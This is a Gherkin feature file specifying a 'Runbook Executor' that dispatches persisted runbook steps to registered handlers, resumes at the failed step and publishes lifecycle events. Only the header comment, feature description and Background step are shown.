#
# Scope: the dispatch-by-step-type execution loop over a persisted Runbook (from
# the Runbook and Step Persistence feature). For each step the executor resolves
# a handler via a step-type registry, runs it, persists the result + status, and
# advances the resume pointer; on failure it stops and a later run re-enters at
# the failed step index (no restart). Lifecycle events runbook-started /
# step-started / step-result / runbook-complete / escalated are announced reusing
# the pipeline_publisher envelope pattern (fire-and-forget; a publish failure is
# logged but never rolls back persisted state). The executor has NO knowledge of
# step internals — registry indirection only. CLI entry: `forge runbook run
# <path-to-runbook-json>`. Unit scenarios use in-memory fake handlers and need no
# subprocess or NATS broker; one @integration @slow scenario publishes to a real
# NATS broker.

@runbook-executor
Feature: Runbook Executor
  As the Forge output-side loop
  I want to execute a persisted runbook step by step, dispatching each step to
  its registered handler and announcing lifecycle events as it goes
  So that a build's steps run to completion, survive failure by resuming from
  where they stopped, and emit an observable event stream

  Background:
    Given a runbook executor configured with a step-type registry and a lifecycle event stream

